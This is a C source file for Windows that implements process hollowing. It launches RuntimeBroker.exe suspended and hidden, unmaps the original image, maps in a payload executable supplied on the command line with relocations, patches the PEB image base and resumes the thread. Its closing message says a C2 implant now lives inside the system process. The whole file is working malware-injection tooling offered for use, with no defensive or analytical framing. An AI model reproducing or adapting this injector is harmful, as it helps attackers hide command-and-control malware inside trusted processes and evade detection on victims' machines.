#include <windows.h>
#include <stdio.h>
#include <string.h>

typedef LONG (NTAPI *pNtUnmapViewOfSection)(HANDLE, PVOID);
typedef LONG (NTAPI *pNtQIP)(HANDLE, ULONG, PVOID, ULONG, PULONG);

typedef struct {
    PVOID Reserved1;
    PVOID PebBaseAddress;
    PVOID Reserved2[2];
    ULONG_PTR UniqueProcessId;
    PVOID Reserved3;
} MY_PBI;

int main(int argc, char *argv[]) {
    if (argc < 2) {
        printf("Usage: %s <payload.exe> [target_exe]\n", argv[0]);
        return 1;
    }

    const char *pe_path = argv[1];
    const char *target  = argc > 2 ? argv[2]
                          : "C:\\Windows\\System32\\RuntimeBroker.exe";

    /* ---- 0. Read replacement PE ---- */
    HANDLE hFile = CreateFileA(pe_path, GENERIC_READ, 0, NULL,
                               OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[-] Cannot open %s (%lu)\n", pe_path, GetLastError());
        return 1;
    }
    DWORD pe_size = GetFileSize(hFile, NULL);
    BYTE *pe_buf = (BYTE *)VirtualAlloc(NULL, pe_size,
                                        MEM_COMMIT, PAGE_READWRITE);
    DWORD nread;
    ReadFile(hFile, pe_buf, pe_size, &nread, NULL);
    CloseHandle(hFile);
    printf("[+] Replacement PE: %lu bytes from %s\n", pe_size, pe_path);

    /* ---- 1. Parse PE headers ---- */
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)pe_buf;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) {
        printf("[-] Not a valid PE\n");
        return 1;
    }
    PIMAGE_NT_HEADERS64 nt =
        (PIMAGE_NT_HEADERS64)(pe_buf + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) {
        printf("[-] Invalid NT signature\n");
        return 1;
    }

    DWORD size_of_image   = nt->OptionalHeader.SizeOfImage;
    DWORD size_of_headers = nt->OptionalHeader.SizeOfHeaders;
    DWORD entry_rva       = nt->OptionalHeader.AddressOfEntryPoint;
    ULONGLONG pe_pref_base = nt->OptionalHeader.ImageBase;
    WORD  num_sections    = nt->FileHeader.NumberOfSections;

    printf("[+] Preferred base: 0x%llx  Entry RVA: 0x%lx\n",
           pe_pref_base, entry_rva);
    printf("[+] SizeOfImage: 0x%lx  Sections: %u\n",
           size_of_image, num_sections);

    /* ---- 2. Build virtual image locally ---- */
    BYTE *image = (BYTE *)VirtualAlloc(NULL, size_of_image,
                                       MEM_COMMIT, PAGE_READWRITE);
    memcpy(image, pe_buf, size_of_headers);

    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < num_sections; i++) {
        if (sec[i].SizeOfRawData > 0) {
            memcpy(image + sec[i].VirtualAddress,
                   pe_buf + sec[i].PointerToRawData,
                   sec[i].SizeOfRawData);
        }
    }
    printf("[+] Virtual image built locally (%lu bytes)\n", size_of_image);

    /* ---- 3. Create suspended process ---- */
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    if (!CreateProcessA(target, NULL, NULL, NULL, FALSE,
                        CREATE_SUSPENDED | CREATE_NO_WINDOW,
                        NULL, NULL, &si, &pi)) {
        printf("[-] CreateProcess failed (%lu)\n", GetLastError());
        return 1;
    }
    printf("[+] Spawned %s  PID=%lu  TID=%lu (SUSPENDED)\n",
           target, pi.dwProcessId, pi.dwThreadId);

    /* ---- 4. Get PEB and original image base ---- */
    pNtQIP NtQueryInformationProcess = (pNtQIP)GetProcAddress(
        GetModuleHandleA("ntdll.dll"), "NtQueryInformationProcess");
    MY_PBI pbi;
    NtQueryInformationProcess(pi.hProcess, 0, &pbi, sizeof(pbi), NULL);

    ULONGLONG orig_base = 0;
    ReadProcessMemory(pi.hProcess,
        (LPCVOID)((ULONGLONG)pbi.PebBaseAddress + 0x10),
        &orig_base, sizeof(orig_base), NULL);
    printf("[+] Original image base: 0x%llx\n", orig_base);

    /* ---- 5. Unmap original image ---- */
    pNtUnmapViewOfSection NtUnmapViewOfSection =
        (pNtUnmapViewOfSection)GetProcAddress(
            GetModuleHandleA("ntdll.dll"), "NtUnmapViewOfSection");
    LONG status = NtUnmapViewOfSection(pi.hProcess, (PVOID)orig_base);
    printf("[+] NtUnmapViewOfSection: 0x%lx\n", status);

    /* ---- 6. Allocate at preferred base, fall back ---- */
    LPVOID remote_base = VirtualAllocEx(pi.hProcess,
        (LPVOID)pe_pref_base, size_of_image,
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remote_base) {
        printf("[!] Preferred base unavailable, trying original base\n");
        remote_base = VirtualAllocEx(pi.hProcess,
            (LPVOID)orig_base, size_of_image,
            MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    }
    if (!remote_base) {
        printf("[-] VirtualAllocEx failed (%lu)\n", GetLastError());
        TerminateProcess(pi.hProcess, 1);
        return 1;
    }
    printf("[+] Allocated 0x%lx bytes at %p\n", size_of_image, remote_base);

    /* ---- 7. Apply relocations if needed ---- */
    LONGLONG delta = (LONGLONG)((ULONGLONG)remote_base - pe_pref_base);
    if (delta != 0) {
        printf("[+] Relocation delta: 0x%llx\n", (long long)delta);

        DWORD reloc_rva  = nt->OptionalHeader
            .DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;
        DWORD reloc_size = nt->OptionalHeader
            .DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;

        if (reloc_rva && reloc_size) {
            DWORD processed = 0;
            PIMAGE_BASE_RELOCATION reloc =
                (PIMAGE_BASE_RELOCATION)(image + reloc_rva);

            while (processed < reloc_size && reloc->SizeOfBlock > 0) {
                DWORD num_entries =
                    (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / 2;
                WORD *entries = (WORD *)(reloc + 1);

                for (DWORD j = 0; j < num_entries; j++) {
                    WORD type   = entries[j] >> 12;
                    WORD offset = entries[j] & 0xFFF;

                    if (type == IMAGE_REL_BASED_DIR64) {
                        ULONGLONG *patch = (ULONGLONG *)
                            (image + reloc->VirtualAddress + offset);
                        *patch += delta;
                    }
                }
                processed += reloc->SizeOfBlock;
                reloc = (PIMAGE_BASE_RELOCATION)
                    ((BYTE *)reloc + reloc->SizeOfBlock);
            }
            printf("[+] Relocations applied\n");
        } else {
            printf("[!] No relocation table\n");
        }
    } else {
        printf("[+] Allocated at preferred base — no relocations needed\n");
    }

    /* ---- 8. Write virtual image to remote process ---- */
    SIZE_T written;
    WriteProcessMemory(pi.hProcess, remote_base, image,
                       size_of_image, &written);
    printf("[+] Wrote %llu bytes to remote process\n",
           (unsigned long long)written);

    /* ---- 9. Update PEB ImageBaseAddress ---- */
    ULONGLONG new_base = (ULONGLONG)remote_base;
    WriteProcessMemory(pi.hProcess,
        (LPVOID)((ULONGLONG)pbi.PebBaseAddress + 0x10),
        &new_base, sizeof(new_base), NULL);
    printf("[+] PEB ImageBaseAddress → 0x%llx\n", new_base);

    /* ---- 10. Resume — loader reads entry from PE at new base ---- */
    printf("[+] Entry point will be 0x%llx (base + 0x%lx)\n",
           (unsigned long long)((ULONGLONG)remote_base + entry_rva),
           entry_rva);

    ResumeThread(pi.hThread);
    printf("[+] Thread resumed. Loader initializing PE in PID %lu\n",
           pi.dwProcessId);

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    VirtualFree(image, 0, MEM_RELEASE);
    VirtualFree(pe_buf, 0, MEM_RELEASE);

    printf("[*] Injector exiting. C2 lives in %s (PID %lu)\n",
           target, pi.dwProcessId);
    return 0;
}
